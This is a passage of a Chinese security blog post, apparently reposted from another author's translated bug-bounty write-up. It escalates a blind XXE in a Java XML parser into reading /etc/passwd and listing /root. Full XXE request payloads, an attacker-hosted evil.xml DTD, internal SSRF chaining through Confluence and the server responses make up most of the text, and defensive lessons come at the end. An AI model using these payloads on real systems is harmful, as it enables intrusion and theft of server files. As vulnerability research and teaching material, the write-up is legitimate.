+<p>为了证明影响，我展示了此漏洞可以用来成功确定文件是否存在:</p>
+<p>请求：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> %ext;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>响应</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The markup declarations contained <span class="keyword">or </span>pointed to <span class="keyword">by </span>the document type declaration must <span class="keyword">be </span>well-formed.</span><br></pre></td></tr></table></figure>
+
+<p>这表明文件存在，XML解析器可以打开和读取文件，但是文件的内容不是有效的文档类型定义(DTD)，因此解析器失败并抛出错误。换句话说，外部实体的加载并没有被禁用，但是我们似乎没有得到任何输出。在这个阶段，这似乎是一个blind XXE漏洞。</p>
+<p>假设使用的是<code>Java</code>的<code>SAX Parser</code>解析器，因为报错似乎和<code>Java</code>错误类<a target="_blank" rel="noopener" href="https://github.com/walkmod/walkmod-core/issues/82">有联系</a><code>org.xml.sax.SAXParseExceptionpublicId</code></p>
+<p>这很有趣，因为Java在涉及XXE时有许多特性，我们稍后将指出这一点。</p>
+<p>当我们访问的文件不存在时，响应是这样的：</p>
+<p>请求</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwdxxx&quot;</span>&gt;</span> %ext;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>响应：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">The</span> request is <span class="attr">invalid</span>: <span class="title class_">The</span> request content was <span class="attr">malformed</span>:</span><br><span class="line"><span class="regexp">/etc/</span>passwdxxx (<span class="title class_">No</span> such file or directory)</span><br></pre></td></tr></table></figure>
+
+<p>好的，有用但不太好; 如何使用这个<code>blind XXE</code>漏洞作为基本端口扫描器？</p>
+<p>请求：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost:22/&quot;</span>&gt;</span> %ext;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>响应</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The request <span class="keyword">is</span> invalid: The request content was malformed:</span><br><span class="line">Invalid Http response</span><br></pre></td></tr></table></figure>
+
+<p>很好——这意味着我们可以列举内部服务。这仍然不是我想要的很酷的结果，但至少是一些值得报道的东西。这种类型的<code>blind XXE</code>有效地表现为与<code>blind</code>服务器端请求伪造(<code>SSRF</code>)漏洞类似的行为:您可以启动内部<code>HTTP</code>请求，但不能读取响应。</p>
+<p>这让我怀疑是否可以应用任何其他与<code>ssrf</code>相关的技术，以便更好地利用这个<code>blind XXE</code>漏洞。需要检查的一件事是对其他协议的支持，包括<code>https</code>、<code>gopher</code>、<code>ftp</code>、<code>jar</code>、<code>scp</code>等。</p>
+<p>请求:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [ <span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;gopher://localhost/&quot;</span>&gt;</span> %ext; ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>响应：</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">The</span> request <span class="keyword">is</span> invalid: <span class="type">The</span> request content was malformed:</span><br><span class="line">unknown <span class="keyword">protocol</span>: <span class="title class_">gopher</span></span><br></pre></td></tr></table></figure>
+
+<p>这很有趣，因为它将用户提供的协议在错误消息中返回回来。我们把它记下来，以后再用。</p>
+<p>漏洞与<code>blind ssrf</code>漏洞具有相似性，看看我们是否能够访问任何内部<code>web</code>应用程序是有意义的。由于我的目标公司似乎与相当广泛和多样化的开发人员合作，<code>GitHub</code>中充斥着<code>x.company.internal</code>格式的地址。我找到了一些看起来很有前途的内部资源（很可能有漏洞的服务器）。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wiki<span class="selector-class">.company</span><span class="selector-class">.internal</span></span><br><span class="line">jira<span class="selector-class">.company</span><span class="selector-class">.internal</span></span><br><span class="line">confluence<span class="selector-class">.company</span><span class="selector-class">.internal</span></span><br></pre></td></tr></table></figure>
+
+<p>考虑到防火墙之前阻止了我的传出流量，我想验证内部流量是否也被阻止了，或者内部网络是否更可信。</p>
+<p>请求：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://wiki.company.internal/&quot;</span>&gt;</span> %ext;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>响应</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The markup declarations contained <span class="keyword">or </span>pointed to <span class="keyword">by </span>the document type declaration must <span class="keyword">be </span>well-formed.</span><br></pre></td></tr></table></figure>
+
+<p>有趣的是，我们以前看到过这个错误消息，它表示读取了请求的资源，但是没有正确格式化。这意味着允许内部网络通信，并且我们的内部请求成功了!</p>
+<p>这就是我们的处境。使用<code>blind XXE</code> 漏洞，可以向许多内部web应用程序发起请求，枚举文件系统中文件的存在性，以及枚举在所有内部主机上运行的服务。在这一点上，我报告了这种漏洞，并在周末前往耶路撒冷的城市之旅中思考进一步的可能性。</p>
+<h2 id="独眼称王"><a href="#独眼称王" class="headerlink" title="独眼称王"></a>独眼称王</h2><p>周末精神焕发地回来后，我下定决心要找出这个脆弱点可能造成的影响。具体来说，如果我可以在内部网络上找到一个类似代理的主机，未经过滤的内部网络流量可能被滥用将流量路由到外部。</p>
+<p>通常，在没有任何形式的可读反馈的情况下，在web应用程序上发现漏洞几乎是不可能的。幸运的是，在<a target="_blank" rel="noopener" href="https://ecosystem.atlassian.net/browse/OAUTH-344">Jira中存在一个已知的SSRF漏洞</a>，这已经在<a target="_blank" rel="noopener" href="https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a">许多文章中</a>得到了证明。</p>
+<p>我立即去测试我的运气与内部的Jira服务器</p>
+<p>请求：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;https://jira.company.internal/plugins/servlet/oauth/users/icon-uri?consumerUri=http://4hm888a6pb127f2kwu2gsek23t9jx8.burpcollaborator.net/x&quot;</span>&gt;</span> %ext;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>响应：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The request is invalid: The request content was malformed:</span><br><span class="line">sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target</span><br></pre></td></tr></table></figure>
+
+<p><code>HTTPS</code> 的流量失败了，如果 <code>SSL</code> 验证出错的话。幸运的是，<code>Jira</code> 默认在<code>8080</code>端口上运行<code>HTTP</code>服务。</p>
+<p>请求：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://jira.company.internal:8080/plugins/servlet/oauth/users/icon-uri?consumerUri=http://4hm888a6pb127f2kwu2gsek23t9jx8.burpcollaborator.net/x&quot;</span>&gt;</span> %ext;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>响应：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">The</span> request is <span class="symbol">invalid:</span> <span class="title class_">The</span> request content was <span class="symbol">malformed:</span></span><br><span class="line"><span class="symbol">http:</span>/<span class="regexp">/jira.company.internal:8080/plugins</span><span class="regexp">/servlet/oauth</span><span class="regexp">/users/icon</span>-uri</span><br></pre></td></tr></table></figure>
+
+<p>我又检查了一下<code>Burp Collaborator</code> 的交互信息，但运气不佳。<code>Jira</code>实例可能已经打了补丁，或者已经禁用了易受攻击的插件。于是，我疯狂而徒劳地寻找不同类型的<code>Wiki</code>应用程序上已知的<code>SSRF</code>漏洞之后(并不是最优选择)，我决定测试内部<code>Confluence</code>实例是否存在相同的<code>Jira</code> 漏洞(默认情况下运行在端口8090上)。</p>
+<p>请求：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://4hm888a6pb127f2kwu2gsek23t9jx8.burpcollaborator.net/x&quot;</span>&gt;</span> %ext;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>响应：</p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The request <span class="built_in">is</span> invalid: The request content was malformed:</span><br><span class="line">The markup declarations contained <span class="built_in">or</span> pointed <span class="keyword">to</span> <span class="keyword">by</span> the document type declaration must be well-formed.</span><br></pre></td></tr></table></figure>
+
+<p>发现</p>
+<p>我们成功地通过一个内部易受攻击的<code>Confluence</code>来绕过防火墙限制出站的<code>internet</code>流量。这意味着我们现在可以尝试<code>XXE</code>的经典方法。让我们从托管一个<code>evil.xml</code>文件开始。攻击者服务器托管<code>evil.xml</code>，包含以下内容，希望触发有趣的错误消息:</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;file:///&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % ent <span class="string">&quot;&lt;!ENTITY data SYSTEM &#x27;%file;&#x27;&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>让我们更详细地看看这些参数实体的定义:</p>
+<ol>
+<li>将外部引用(在本例中是系统的&#x2F;目录)的内容加载到变量中(%file)</li>
+<li>定义一个变量(%ent);它实际上只是将各个部分链接在一起来解释第三个实体</li>
+<li>尝试在（%file）位置访问资源;(无论它指向何处)并将该位置中的任何内容加载到实体（data）中。</li>
+</ol>
+<p>注意，我们希望第三个定义失败，因为<code>（%file）</code>的内容;不会指向有效的资源位置，而是包含完整目录的内容。</p>
+<p>现在，使用<code>Confluence</code>（<code>proxy</code>）指向我们的恶意文件，并确保参数<code>（%ent）</code>; 实体参数<code>(&amp;data；)</code>被访问以触发目录访问:</p>
+<p>请求：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://my_evil_site/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%ext;</span></span><br><span class="line"><span class="meta">%ent;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;data;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>响应</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">no protocol: <span class="keyword">bin</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">boot</span></span><br><span class="line"><span class="keyword"></span>dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<p>太棒了!列出了服务器的目录内容!</p>
+<p>有趣的是，这显示了从服务器返回基于错误的输出的另一种方法，即指定一个“丢失的”协议，而不是我们前面看到的无效协议。</p>
+<p>这可以帮助我们解决在读取包含冒号的文件时遇到的最后一个难点，因为使用上述方法读取<code>/etc/passwd</code>会导致以下错误:</p>
+<p>请求：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://my_evil_site/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%ext;</span></span><br><span class="line"><span class="meta">%ent;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;data;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>响应：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">unknown</span> protocol: root</span><br></pre></td></tr></table></figure>
+
+<p>换句话说，在冒号<code>:</code>第一次出现之前，可以读取文件，但是读取冒号之后不能再读取了。绕过这一点并强制在错误消息中显示完整的文件内容的一种方法是在文件内容之前加上一个冒号。这将导致<code>no protocol</code>错误，因为第一个冒号之前的字段将是空的，即未定义。托管的 <code>evil.xml</code> 修改为:</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % ent <span class="string">&quot;&lt;!ENTITY data SYSTEM &#x27;:%file;&#x27;&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>请求：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://my_evil_site/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%ext;</span></span><br><span class="line"><span class="meta">%ent;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;data;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>响应：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">no <span class="symbol">protocol:</span> <span class="symbol">:root</span><span class="symbol">:x</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span></span><br><span class="line">[…]</span><br></pre></td></tr></table></figure>
+
+<p>Java 在访问目录时还会返回目录列表，于是尝试访问根目录文件。</p>
+<p>evil.xml</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;file:///root&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % ent <span class="string">&quot;&lt;!ENTITY data SYSTEM &#x27;:%file;&#x27;&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>请求：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://my_evil_site/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%ext;</span></span><br><span class="line"><span class="meta">%ent;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;data;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>响应：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">no protocol: :.bash_history</span><br><span class="line">.bash_logout</span><br><span class="line">.bash_profile</span><br><span class="line">.bashrc</span><br><span class="line">.pki</span><br><span class="line">.ssh</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<p>就是这样，看来我们很幸运。通过滥用不充分的网络分隔、未打补丁的内部应用程序服务器、过度特权的web服务器以及通过过于冗长的错误消息传递导致的信息泄漏，我们成功地将一个<code>blind XXE</code>漏洞提升为读取<code>root</code>目录和文件的漏洞。</p>
+<h2 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h2><p>红队：</p>
+<ol>
+<li>如果有东西看起来很奇怪，那么继续挖掘</li>
+<li><code>Java SAX</code>解析器对<code>URL</code>模式的有趣处理允许使用一些新的方法提取信息。虽然现代<code>Java</code>版本不允许将多行文件作为外部HTTP请求(即<code>attacker.org/?&amp;file;</code>)的方式导出，但是在错误消息中，甚至在<code>URL</code>协议中，都可以获得多行响应</li>
+</ol>
+<p>蓝队：</p>
+<ol>
+<li>确保内部服务器和面向公众的服务器一样得到了及时的修补</li>
+<li>不要把内部网络视为一个受信任的安全区，而应采用适当的网络分隔</li>
+<li>将详细的错误消息写入错误日志，而不是HTTP响应</li>
+<li>依赖身份验证并不一定能缓解诸如XXE之类的低级问题</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/heycomputer/articles/10263382.html">https://www.cnblogs.com/heycomputer/articles/10263382.html</a></p>
+<hr>
+<p>就这么多吧（抄别人的博客的作者是屑）</p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2023/09/01/drone/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/08/27/pwnfd/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-08-28 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/CTF/">CTF<span>19</span></a></li> <li><a href="/categories/CTF/2023MoeCTF/">2023MoeCTF<span>17</span></a></li> <li><a href="/categories/CTF/2023MoeCTF/Web/">Web<span>6</span></a></li>
+
+<div class="widget tag">
+  <h3 class="title">All Categories</h3>
+     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">19</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/2023MoeCTF/">2023MoeCTF</a><span class="category-list-count">17</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/2023MoeCTF/Classical-Crypto/">Classical Crypto</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/2023MoeCTF/Misc/">Misc</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/2023MoeCTF/PWN/">PWN</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/2023MoeCTF/Reverse/">Reverse</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/2023MoeCTF/Web/">Web</a><span class="category-list-count">6</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/DgutCTF/">DgutCTF</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/DgutCTF/Web/">Web</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/DgutCTF/Web/php/">php</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/DgutCTF/Web/unicode/">unicode</a><span class="category-list-count">1</span></li></ul></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/SRC%E6%8C%96%E6%8E%98/">SRC挖掘</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA%E9%A1%B9%E7%9B%AE/">个人项目</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/">奇技淫巧</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/Getshell/">Getshell</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="category-list-count">5</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/LAN-Network/">LAN Network</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/LAN-Network/Shell/">Shell</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" 